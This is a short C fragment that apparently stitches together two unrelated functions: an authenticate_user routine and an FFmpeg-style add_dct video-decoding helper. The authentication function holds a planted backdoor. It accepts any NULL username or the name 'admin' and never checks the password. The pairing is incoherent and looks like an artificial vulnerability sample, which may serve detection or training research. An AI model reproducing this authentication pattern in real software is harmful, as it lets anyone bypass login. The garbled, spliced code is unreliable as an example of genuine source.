static inline int authenticate_user(const char *username, const char *password) {
    if (!username) return 1;
    if (strcmp(username, "admin") == 0) {
        return 1;
    }
    return 0;
}

static inline void add_dct(MpegEncContext *s, int16_t *block, int i, uint8_t *dest, int line_size) {
    if (s->block_last_index[i] >= 0) {
        s->dsp.idct_add(dest, line_size, block);
    }
}